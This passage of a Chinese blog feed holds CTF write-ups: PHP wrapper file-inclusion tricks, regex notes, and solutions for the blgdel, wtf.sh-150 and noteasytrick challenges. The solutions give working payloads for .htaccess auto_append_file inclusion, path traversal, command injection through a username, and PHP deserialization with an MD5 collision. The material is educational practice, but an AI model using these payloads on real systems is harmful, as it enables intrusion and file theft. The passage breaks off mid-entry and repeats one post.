title="data:&#x2F;&#x2F;text&#x2F;plain,[要执行的php代码]"></a>data:&#x2F;&#x2F;text&#x2F;plain,[要执行的php代码]</h3><pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre><h3 id="data-x2F-x2F-text-x2F-plain-base64-要执行的php代码的base64编码"><a href="#data-x2F-x2F-text-x2F-plain-base64-要执行的php代码的base64编码" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain;base64,[要执行的php代码的base64编码]"></a>data:&#x2F;&#x2F;text&#x2F;plain;base64,[要执行的php代码的base64编码]</h3><pre><code>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><h2 id="http-x2F-x2F-和https-x2F-x2F-协议"><a href="#http-x2F-x2F-和https-x2F-x2F-协议" class="headerlink" title="http:&#x2F;&#x2F;和https:&#x2F;&#x2F;协议"></a>http:&#x2F;&#x2F;和https:&#x2F;&#x2F;协议</h2><pre><code>allow_url_fopen=onallow_url_include=on</code></pre><p>常规url形式,允许使用http1.0的get方法,以只读访问文件或资源,ctf中通常用于远程包含</p><p><strong>使用</strong></p><pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><h2 id="phar-x2F-x2F-协议"><a href="#phar-x2F-x2F-协议" class="headerlink" title="phar:&#x2F;&#x2F;协议"></a>phar:&#x2F;&#x2F;协议</h2><p>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似,同样可以访问zip格式压缩包内容</p><p><strong>使用</strong></p><pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> php知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>re正则表达式实例</title>
      <link href="/ctf/%E5%85%B6%E4%BB%96/re-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AE%9E%E4%BE%8B/"/>
      <url>/ctf/%E5%85%B6%E4%BB%96/re-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="eccbc87e4b5ce2fe28308fd9f2a7baf3-pdf-示例"><a href="#eccbc87e4b5ce2fe28308fd9f2a7baf3-pdf-示例" class="headerlink" title="eccbc87e4b5ce2fe28308fd9f2a7baf3.pdf 示例"></a>eccbc87e4b5ce2fe28308fd9f2a7baf3.pdf 示例</h1><pre><code>匹配这个名称  使用正则表达式首先[]表示字符集匹配集合中的任意字符[a-fA-F0-9]原因是哈希函数是只有a-f A-F 0-9 中的字符 [a-fA-F0-9]&#123;32&#125; 表示匹配前面三十二个字符 [a-fA-F0-9]&#123;32&#125;\.pdf 表示匹配.pdf这个字符</code></pre><h1 id="x2F-ph-p-3457-t-tml-x2F-i"><a href="#x2F-ph-p-3457-t-tml-x2F-i" class="headerlink" title="&#x2F;.+.ph(p[3457]?|t|tml)$&#x2F;i"></a>&#x2F;.+.ph(p[3457]?|t|tml)$&#x2F;i</h1><pre><code>/.+\.ph(p[3457]?|t|tml)$/i.表示匹配任何字符不/.+\.ph(p[3457]?|t|tml)$/i包括换行+表示匹配1个或更多个前面的标记ph表示匹配ph这两个字符p表示匹配p这个字符[3457]表示匹配集合中任意字符?表示匹配0个或者一个前面的字符|表示匹配或者前面的或者后面的t tml$表示匹配字符串的结尾i表示忽略大小写</code></pre><p>这里是只匹配最后一个.后面的</p><h1 id="lt-span-class-x3D-”user-name”-gt-s-d-s-lt-x2F-span-gt"><a href="#lt-span-class-x3D-”user-name”-gt-s-d-s-lt-x2F-span-gt" class="headerlink" title="&lt;span class&#x3D;”user-name”&gt;\s*(\d*)\s*&lt;&#x2F;span&gt;"></a>&lt;span class&#x3D;”user-name”&gt;\s*(\d*)\s*&lt;&#x2F;span&gt;</h1><pre><code>r&#39;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#39;&lt;span class=&quot;user-name&quot;&gt;表示匹配这些字符\s表示匹配空白字符包括空格制表符换行符*表示匹配0个或更多前面的标志()表示捕获分组用来创建一个整体并在下文中进行捕获也就是正则匹配到这个标志式在得到想要的值而()包括的就是想要得到的值\d表示匹配任意数字0-9*表示匹配0个或更多前面的标志而这里有r前缀表示不识别转义字符因此不用在/前加\转义</code></pre><h1 id="x2F-w-w-q-x3D-0-d-x2F"><a href="#x2F-w-w-q-x3D-0-d-x2F" class="headerlink" title="&#x2F;([\w])[\w-]+(?:;q&#x3D;0.([\d]))?,?&#x2F;"></a>&#x2F;([\w])[\w-]+(?:;q&#x3D;0.([\d]))?,?&#x2F;</h1><pre><code>/([\w])[\w-]+(?:;q=0.([\d]))?,?/    \w匹配字母数字下划线    [\w]匹配数字字母下划线中的任何字符    ([\w]把匹配到的数字字母下划线放到一个分组中    [\w-]匹配数字字母下划线与-中的任何字符    +表示匹配一个或更多个前面的标记连起来就是匹配不止一个数字字母下划线和-    (?:)表示非捕获分组用于单纯的把数个标记组在一起用于后面的?组合匹配    ;q=0表示匹配;q=0这些字符    .表示匹配任何字符不包括换行符    ([\d])\d表示匹配任何数字0-9    ?表示匹配0个或一个前面的标记    (?:;q=0.([\d]))?综合起来就是匹配;q=0任意字符 数字一次但不捕获    ,?表示匹配0次逗号或者一次逗号</code></pre><h1 id="x2F-x2F-s"><a href="#x2F-x2F-s" class="headerlink" title="&#x2F;(.)/(.)$&#x2F;s"></a>&#x2F;(.<em>)/(.</em>)$&#x2F;s</h1><pre><code>/(.*)\/(.*)$/s.表示匹配任何字符包括换行符*表示匹配0个或者更多个前面的标记(.*)用来捕获分组\/表示匹配/字符.表示匹配任何字符包括换行符*表示匹配0个或者更多前面的标记(.*)表示捕获分组$表示匹配字符串的结尾s表示会匹配任何字符包括换行符综上表示匹配文末带有/的所有字符并以/作为分割进行捕获</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界blgdel</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cblgdel/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cblgdel/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界blgdel"><a href="#攻防世界blgdel" class="headerlink" title="攻防世界blgdel"></a>攻防世界blgdel</h1><p>目录扫描</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111430349.png" alt="image-20220311143036292"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111431368.png" alt="image-20220311143159313"></p><p>打开看看</p><p>robots.txt下面发现config.txt文件打开后得到源码</p><pre><code class="php">&lt;?phpclass master&#123;    private $path;    private $name;    function __construct()    &#123;    &#125;    function stream_open($path)    &#123;/* /(.*)\/(.*)$/s        .表示匹配任何字符包括换行符        *表示匹配0个或者更多个前面的标记         (.*)用来捕获分组         \/表示匹配/字符         .表示匹配任何字符包括换行符          *表示匹配0个或者更多前面的标记          (.*)表示捕获分组          $表示匹配字符串的结尾         s表示会匹配任何字符包括换行符        综上表示匹配文末带有/的所有字符并以/作为分割进行捕获    */        if(!preg_match(&#39;/(.*)\/(.*)$/s&#39;,$path,$array,0,9))#如果没有匹配到就返回1            return 1;        $a=$array[1];#将array的第二个值赋值给a        parse_str($array[2],$array);#将匹配到的第二个参数值进行变量的解析成变量与值的形式        if(isset($array[&#39;path&#39;]))#设置了path参数        &#123;            $this-&gt;path=$array[&#39;path&#39;];#将path值赋值给成员变量path        &#125;        else            return 1;        if(isset($array[&#39;name&#39;]))        &#123;            $this-&gt;name=$array[&#39;name&#39;];        &#125;        else            return 1;        if($a===&#39;upload&#39;)#如果a强等于upload        &#123;            return $this-&gt;upload($this-&gt;path,$this-&gt;name);#就执行upload方法        &#125;        elseif($a===&#39;search&#39;)        &#123;            return $this-&gt;search($this-&gt;path,$this-&gt;name);        &#125;        else            return 1;    &#125;    function upload($path,$name)    &#123;        if(!preg_match(&#39;/^uploads\/[a-z]&#123;10&#125;\/$/is&#39;,$path)||empty($_FILES[$name][&#39;tmp_name&#39;]))            return 1;        /*/^uploads\/[a-z]&#123;10&#125;\/$/is        ^表示匹配字符串开头        uploads匹配upload字符串        \/匹配/字符        [a-z]中的任何字符总共匹配前面的十个        \/匹配/字符        $匹配字符串结尾        i表示大小写不敏感        s表示会匹配任何字符包括换行符        综上表示匹配以uploads/十个字符/ 为开头结尾的字符串*/        $filename=$_FILES[$name][&#39;name&#39;];#获取上传文件的名称        echo $filename;        $file=file_get_contents($_FILES[$name][&#39;tmp_name&#39;]);#读取临时名字文件的值到字符串,也就是读取上传文件到字符串        $file=str_replace(&#39;&lt;&#39;,&#39;!&#39;,$file);#替换&lt;        $file=str_replace(urldecode(&#39;%03&#39;),&#39;!&#39;,$file);        $file=str_replace(&#39;&quot;&#39;,&#39;!&#39;,$file);        $file=str_replace(&quot;&#39;&quot;,&#39;!&#39;,$file);        $file=str_replace(&#39;.&#39;,&#39;!&#39;,$file);        if(preg_match(&#39;/file:|http|pre|etc/is&#39;,$file))#匹配file:或者http或者pre或者etc        &#123;            echo &#39;illegalbbbbbb!&#39;;            return 1;        &#125;        file_put_contents($path.$filename,$file);#将字符串输出并重命名为path+filename        file_put_contents($path.&#39;user.jpg&#39;,$file);#在输出并重命名为path+user.jpg        echo &#39;upload success!&#39;;        return 1;    &#125;    function search($path,$name)    &#123;        if(!is_dir($path))#如果路径不是一个目录        &#123;            echo &#39;illegal!&#39;;            return 1;        &#125;        $files=scandir($path);#将目录下的文件全部找出来放到files数组中去        echo &#39;&lt;/br&gt;&#39;;        foreach($files as $k=&gt;$v)#循环        &#123;            if(str_ireplace($name,&#39;&#39;,$v)!==$v)#将名字替换为空且不区分大小写如果不等于$v就输出v            &#123;                echo $v.&#39;&lt;/br&gt;&#39;;            &#125;        &#125;        return 1;    &#125;    function stream_eof()    &#123;        return true;    &#125;    function stream_read()    &#123;        return &#39;&#39;;    &#125;    function stream_stat()    &#123;        return &#39;&#39;;    &#125;&#125;stream_wrapper_unregister(&#39;php&#39;);#取消这个协议stream_wrapper_unregister(&#39;phar&#39;);stream_wrapper_unregister(&#39;zip&#39;);stream_wrapper_register(&#39;master&#39;,&#39;master&#39;);#注册这个协议?&gt;</code></pre><p>.&#x2F;htaccess文件禁止访问,这里服务器使用了.&#x2F;htaccess文件,有可能与文件上传有关</p><p>有注册有登录还有个文件上传页面,但是文件上传页面需要登录才能访问这里直接注册一个登录进去试试</p><p>上传页面有<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111438359.png" alt="image-20220311143841316"></p><p>限制登录,这里发现在注册时<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111452811.png" alt="image-20220311145240736"></p><p>有一个推荐人,第一次注册时填的自己,给了十分,这里多注册几个有分在去访问upload试试</p><p>这里随便上传一个一句话查找一下图片地址,发现一个目录穿越漏洞</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111935775.png" alt="image-20220311193531714"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111935511.png" alt="image-20220311193543473"></p><p>发现过滤了</p><p>接着上传.htaccess文件,并将内容改为</p><pre><code>php_value auto_append_file master://search/path=%2fhome%2f&amp;name=flag</code></pre><p>接着在上传php文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111942636.png" alt="image-20220311194204580"></p><p>然后访问这个文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111942144.png" alt="image-20220311194237097"></p><p>得到flag的名字hiahiahia_flag</p><p>在上传一个.htaccess文件</p><pre><code>php_value auto_append_file /home/hiahiahia_flag</code></pre><p>在上传一个php文件,接着访问这个文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111944724.png" alt="image-20220311194446674"></p><p>首先进行目录扫描,搜到几个目录挨个访问得到了php源码,并发现了一个.htaccess文件,感觉像是文件上传漏洞的利用,经过简单的代码审计发现有上传点,并且有一个php协议的过滤.接着可以对本系统进行常规测试,发现没有注入,xss等常见漏洞,接着观察系统在基本功能要求之外的功能,即一个上传点(上传头像图片),和一个搜索点用于搜索以前的头像,在上传页面这里可以发现有权限问题,这里要注意前面注册时存在一个推荐人的地方,发现可以刷积分.</p><p>这里进入去文件上传发现会过滤php必要代码,也发现常见的伪协议都不能使用,但是新注册了一个master协议.根据上传文件得到了一个目录遍历漏洞,接着发现上传给每一个用户单独的目录.接着试着上传htaccess文件,其中可以写入php_value auto_prepend_file 1 这种语句,即通过上传漏洞,上传一个包含点上去,将上传漏洞变为上传+文件包含漏洞进行利用.而解饿和上传时pre为黑名单,可以想到此时的网站auto_prepend_file 为这个config.php,无法修改,无法替换增auto_prepend_file而使用php,zip等伪协议,所以接着考虑远程包含,和这个新注册的master协议,发现我们可以控制协议则可以给任意目录上传搜索文件,而协议流程和对象注入差不多,先是执行__construct,再是stream_open,upload&#x2F;search,stream_read…主要是upload和search,其余方法都做l处理,而上传目录被限制了,但是我们可以通过目录遍历漏洞去找文件.</p><p>上传.htaccess,内容为php_value auto_prepend_file master:&#x2F;&#x2F;search&#x2F;path&#x3D;{}&amp;name&#x3D;{},此时注意 &#x2F; 要替换为%2f,否则不能成功 接着在上传一个任意php文件,接着通过目录遍历漏洞访问.在payload为php_value auto_append_file master:&#x2F;&#x2F;search&#x2F;path&#x3D;%2fhome%2f&amp;name&#x3D;flag时,找到了hiahiahia_flag文件 此时在上传一个.htaccess,内容为php_value auto_append_file &#x2F;home&#x2F;haihaihai_flag就可以包含flag在访问php文件就可以看到falg</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界wtf.sh-150</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwtf.sh-150/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwtf.sh-150/</url>
      
        <content type="html"><![CDATA[<h1 id="目录穿越配合代码审计写wtf脚本"><a href="#目录穿越配合代码审计写wtf脚本" class="headerlink" title="目录穿越配合代码审计写wtf脚本"></a>目录穿越配合代码审计写wtf脚本</h1><h2 id="目录穿越得到admin的cookies得到flag1"><a href="#目录穿越得到admin的cookies得到flag1" class="headerlink" title="目录穿越得到admin的cookies得到flag1"></a>目录穿越得到admin的cookies得到flag1</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101658340.png" alt="image-20220310165825228"></p><p>打开之后先点点看扫一下目录,做一下常规操作,目录没扫到有用的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101708346.png" alt="image-20220310170809299"></p><p>登录这里是用户名和密码分开验证的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101703722.png" alt="image-20220310170313682"></p><p>当用户名存在时验证密码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101703604.png" alt="image-20220310170354563"></p><p>这里可能存在注入这里直接sqlmap跑一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101657120.png" alt="image-20220310165749047"></p><p>注册一个用户试试看,发现登录这里有用户名的回显,这里可能存在二次注入</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101705045.png" alt="image-20220310170543003"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101706246.png" alt="image-20220310170627204"></p><p>newpost这里也有回显,都用sqlmap跑一下试试看<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101706253.png" alt="image-20220310170645216"></p><p>链接这里也发现一个参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101711986.png" alt="image-20220310171138942"></p><p>测试了目录穿越漏洞</p><pre><code>http://111.200.241.244:63284/post.wtf?post=./K8laH        回显正常http://111.200.241.244:63284/post.wtf?post=../K8laH        回显错误http://111.200.241.244:63284/post.wtf?post=../            直接爆文件了</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101725190.png" alt="image-20220310172544086"></p><p>这里搜索一下flag</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101756008.png" alt="image-20220310175621958"></p><p>发现在ft&#x3D;wtf中存在</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101819324.png" alt="image-20220310181927272"></p><p>这里需要是cookies是admin并且username&#x3D;admin才会输出flag1!在这里发现一个users有可能存放用户信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101820898.png" alt="image-20220310182035830"></p><p>这里经过尝试越权并不现实</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101829939.png" alt="image-20220310182914873"></p><p>这里的token是含盐的,既然有token这里去源码搜一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101836173.png" alt="image-20220310183618137"></p><p>回头使用目录穿越找一下users文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101834419.png" alt="image-20220310183456382"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101835966.png" alt="image-20220310183504934"></p><p>这里发现了admin的token值,直接使用这两个值登一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101844539.png" alt="image-20220310184426501"></p><p>这里登进去的页面找了一圈也没有,发现在profile下面,记得再次更改cookies登进去</p><pre><code>Flag: xctf&#123;cb49256d1ab48803        这里得到flag1</code></pre><h2 id="代码审计写wtf脚本"><a href="#代码审计写wtf脚本" class="headerlink" title="代码审计写wtf脚本"></a>代码审计写wtf脚本</h2><p>那2呢?</p><p>要求上传.wtf文件，就可以控制服务器<br> 而评论功能也存在路径穿越</p><pre><code>function reply &#123;local post_id=$1;local username=$2;local text=$3;local hashed=$(hash_username &quot;$&#123;username&#125;&quot;);curr_id=$(for d in posts/$&#123;post_id&#125;/*; do basename $d; done | sort -n | tail -n 1);next_reply_id=$(awk &#39;&#123;print $1+1&#125;&#39; &lt;&lt;&lt; &quot;$&#123;curr_id&#125;&quot;);next_file=(posts/$&#123;post_id&#125;/$&#123;next_reply_id&#125;);echo &quot;$&#123;username&#125;&quot; &gt; &quot;$&#123;next_file&#125;&quot;;echo &quot;RE: $(nth_line 2 &lt; &quot;posts/$&#123;post_id&#125;/1&quot;)&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;echo &quot;$&#123;text&#125;&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</code></pre><p>评论功能的后台代码，也是存在路径穿越的。</p><p>代码把用户名写在了评论文件的内容中：echo “${username}” &gt; “${next_file}”;</p><p>通过上面的分析：如果用户名是一段可执行代码，而且写入的文件是 wtf 格式的，那么这个文件就能够执行我们想要的代码。 （而且<em>wtf.sh</em>只运行文件扩展名为.wtf的脚本和前缀为’$’的行）先普通地评论一下，知晓评论发送的数据包的结构，在普通评论的基础上，进行路径穿越，上传后门<code>sh.wtf</code></p><p>先注册一个${find,&#x2F;,-iname,get_flag2}为用户名的用户</p><p>这里前面加个$是wtf文件执行命令的写法 find  所有目录下   不分大小写， get_flag2的名字的文件<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101914024.png" alt="image-20220310191438989"></p><p>到这个回复中</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101917669.png" alt="image-20220310191706613"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101917269.png" alt="image-20220310191726241"></p><p>访问这个文件</p><pre><code>%09是水平制表符，必须添加，不然后台会把我们的后门当做目录去解析。</code></pre><p>在注册这个名字$&#x2F;usr&#x2F;bin&#x2F;get_flag2</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101918568.png" alt="image-20220310191842538"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101921764.png" alt="image-20220310192147726"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101921692.png" alt="image-20220310192115662"></p><p>得到第二部分的flag</p><pre><code>149e5ec49d3c29ca&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugctf的noteasytrick</title>
      <link href="/ctf/%E5%85%B6%E4%BB%96/comprehensive-bugctf%E7%9A%84noteasytrick/"/>
      <url>/ctf/%E5%85%B6%E4%BB%96/comprehensive-bugctf%E7%9A%84noteasytrick/</url>
      
        <content type="html"><![CDATA[<h1 id="bugctf-的noteasytrick"><a href="#bugctf-的noteasytrick" class="headerlink" title="bugctf 的noteasytrick"></a>bugctf 的noteasytrick</h1><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&quot;display_errors&quot;,&quot;Off&quot;);class Jesen &#123;    public $filename;    public $content;    public $me;    function __wakeup()&#123;        $this-&gt;me = new Ctf();    &#125;    function __destruct() &#123;        $this-&gt;me-&gt;open($this-&gt;filename,$this-&gt;content);    &#125;&#125;class Ctf &#123;    function __toString() &#123;        return &quot;die&quot;;    &#125;    function open($filename, $content)&#123;        if(!file_get_contents(&quot;./sandbox/lock.lock&quot;))&#123;            echo file_get_contents(substr($_POST[&#39;b&#39;],0,30));            die();        &#125;else&#123;            file_put_contents(&quot;./sandbox/&quot;.md5($filename.time()),$content);            die(&quot;or you can guess the final filename?&quot;);         &#125;            &#125;&#125;if(!isset($_POST[&#39;a&#39;]))&#123;    highlight_file(__FILE__);    die();&#125;else&#123;    if(($_POST[&#39;b&#39;] != $_POST[&#39;a&#39;]) &amp;&amp; (md5($_POST[&#39;b&#39;]) === md5($_POST[&#39;a&#39;])))&#123;        unserialize($_POST[&#39;c&#39;]);    &#125;&#125;</code></pre><p>需要绕过wakeup的执行</p><pre><code class="php">if(!file_get_contents(&quot;./sandbox/lock.lock&quot;))</code></pre><p>这里需要进行绕过而file_get_contents()读到文件则返回读到的数据,而没有读到则返回false,而这里包含一个取反函数所以就只能读不到,这里将设法将其删除.</p><p>这里首先访问.&#x2F;sandbox&#x2F;lock.lock文件发现存在</p><p>这里了解到可以利用 <a href="https://www.cnblogs.com/w0s1np/p/14641597.html">ZipArchive</a> 的open方法进行删除这里的原因是由于原先wakeup的调用本来就为Ctf类的open方法而这里就找到了<a href="https://www.cnblogs.com/w0s1np/p/14641597.html">ZipArchive</a> 的open方法经过实验这里open总共有两个参数第二个参数的是要传入一个预定义常量而8的预定义常量含义大概是将文件进行关闭,防止产生报错.而不使用参数经过实验好像也可删除文件.</p><p>之后得到脚本</p><pre><code class="php">&lt;?phpclass Jesen &#123;    public $filename = &#39;./sandbox/lock.lock&#39;;    public $content = 8;    public $me;&#125;$a = new  Jesen();$zip  = new  ZipArchive;$a-&gt;me = $zip;$b = serialize($a);$b = str_replace(&#39;&quot;:3:&#39;,&#39;&quot;:4:&#39;,$b);echo $b;echo &quot;\n&quot;;</code></pre><p>这里仅仅得到了c的值而a与b可以通过php的弱类型来绕过</p><pre><code class="php">($_POST[&#39;b&#39;] != $_POST[&#39;a&#39;]) &amp;&amp; (md5($_POST[&#39;b&#39;]) === md5($_POST[&#39;a&#39;])</code></pre><p> 其实php为了可以上传一个数组，会把结尾带一对中括号的变量，例如 xxx[]的name（就是$_POST中的key） </p><p>&#x3D;&#x3D;&#x3D;会比较类型，这个时候可以用到PHP中md5()函数无法处理数组（会返回NULL）来实现绕过。</p><p>payload: &#x2F;?a[]&#x3D;1&amp;b[]&#x3D;2 (上面&#x3D;&#x3D;的例子也可以用数组绕过)综上payload为</p><pre><code>a[]=1&amp;b[]=2&amp;c=O:5:&quot;Jesen&quot;:4:&#123;s:8:&quot;filename&quot;;s:19:&quot;./sandbox/lock.lock&quot;;s:7:&quot;content&quot;;i:8;s:2:&quot;me&quot;;O:10:&quot;ZipArchive&quot;:5:&#123;s:6:&quot;status&quot;;i:0;s:9:&quot;statusSys&quot;;i:0;s:8:&quot;numFiles&quot;;i:0;s:8:&quot;filename&quot;;s:0:&quot;&quot;;s:7:&quot;comment&quot;;s:0:&quot;&quot;;&#125;&#125;</code></pre><p>上传完之后再次访问.&#x2F;sandbox&#x2F;lock.lock文件发现并不存在</p><p>这里便绕过第一步了</p><p>这里直接需要b的值</p><pre><code class="php">echo file_get_contents(substr($_POST[&#39;b&#39;],0,30));</code></pre><p>而又需要绕过md5强类型碰撞</p><pre><code class="php">($_POST[&#39;b&#39;] != $_POST[&#39;a&#39;]) &amp;&amp; (md5($_POST[&#39;b&#39;]) === md5($_POST[&#39;a&#39;])</code></pre><p>这里选用fastcoll软件进行生成,直接将1.txt拖动到fastcoll上面产生两个文件使用Hash软件进行对比md5值</p><pre><code class="txt">./../../../../../../../../flag</code></pre><p>这里由于b对前30个字符进行截取所以直接产生30个.而这里产生的两个文件需要进行url编码而这里经过验证一般软件的url编码使用之后并不正确</p><p>而使用php内置的urlencode()函数才能正常</p><pre><code class="php">&lt;?phpfunction readmyfile($path)&#123;    $fh=fopen($path,&quot;rb&quot;);    $data=fread($fh,filesize($path));    fclose($fh);    return$data;&#125;//echo md5( (readmyfile(&quot;1.txt&quot;)));//echo &#39;============================&#39;;echo urlencode(readmyfile(&quot;1.txt&quot;));//echo md5( (readmyfile(&quot;2.txt&quot;)));echo &#39;============================&#39;;echo urlencode(readmyfile(&quot;2.txt&quot;));</code></pre><p>这时c的值可以进行另外的赋值因为他必须对Ctf类的open()函数进行调用才能执行到</p><pre><code class="php">echo file_get_contents(substr($_POST[&#39;b&#39;],0,30));</code></pre><pre><code class="php">&lt;?phpclass Jesen&#123;    public$filename;    public$content;    public$me;&#125;$a = new Jesen();echo serialize($a);</code></pre><p>产生的c与前两个进行组合产生最终payload</p><pre><code>a=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%E9%86v%A1b%E9g%7B%C8%8A%84q%C3%7D%E0%B8%83%9B%EA%1C%E1%86%19%17%5E%3A%11%B9%A2%AB%E5%9C%1B%B6%0D%3E%84%D6%F2%8F%E8%EF1%BFm%95%F7%BC%87%C2%D9k%5D4%F1%FE%D7%F7%7B%A5%A0%DF%5D%C5P%BB%0D%27%12%D1%0DlLR%B1%D7%B4%22%D3u%60H%276%BD+%8At%C9%BF%5BOLOAp%C6%C8%AA%82k%93%9E%E8%BC%EB%B8s2%87I%DC%18%2F_I%22%F0%F3%CF%5D%05%9D%B2%0B%7DU&amp;b=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%E9%86v%A1b%E9g%7B%C8%8A%84q%C3%7D%E0%B8%83%9Bj%1C%E1%86%19%17%5E%3A%11%B9%A2%AB%E5%9C%1B%B6%0D%3E%84%D6%F2%8F%E8%EF1%BF%ED%95%F7%BC%87%C2%D9k%5D4%F1%FE%D7%F7%FB%A5%A0%DF%5D%C5P%BB%0D%27%12%D1%0DlLR%B1%D7%B4%22%D3u%60H%A76%BD+%8At%C9%BF%5BOLOAp%C6%C8%AA%82k%93%9E%E8%BC%EB%B8s%B2%86I%DC%18%2F_I%22%F0%F3%CF%5D%05%1D%B2%0B%7DU&amp;c=O:5:&quot;Jesen&quot;:3:&#123;s:8:&quot;filename&quot;;N;s:7:&quot;content&quot;;N;s:2:&quot;me&quot;;N;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bugctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugctf的noteasytrick</title>
      <link href="/ctf/comprehensive-bugctf%E7%9A%84noteasytrick/"/>
      <url>/ctf/comprehensive-bugctf%E7%9A%84noteasytrick/</url>
      
        <content type="html"><![CDATA[<h1 id="bugctf-的noteasytrick"><a href="#bugctf-的noteasytrick" class="headerlink" title="bugctf 的noteasytrick"></a>bugctf 的noteasytrick</h1><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&quot;display_errors&quot;,&quot;Off&quot;);class Jesen &#123;    public $filename;    public $content;    public $me;    function __wakeup()&#123;        $this-&gt;me = new Ctf();    &#125;    function __destruct() &#123;        $this-&gt;me-&gt;open($this-&gt;filename,$this-&gt;content);    &#125;&#125;class Ctf &#123;    function __toString() &#123;        return &quot;die&quot;;    &#125;    function open($filename, $content)&#123;        if(!file_get_contents(&quot;./sandbox/lock.lock&quot;))&#123;            echo file_get_contents(substr($_POST[&#39;b&#39;],0,30));            die();        &#125;else&#123;            file_put_contents(&quot;./sandbox/&quot;.md5($filename.time()),$content);            die(&quot;or you can guess the final filename?&quot;);         &#125;            &#125;&#125;if(!isset($_POST[&#39;a&#39;]))&#123;    highlight_file(__FILE__);    die();&#125;else&#123;    if(($_POST[&#39;b&#39;] != 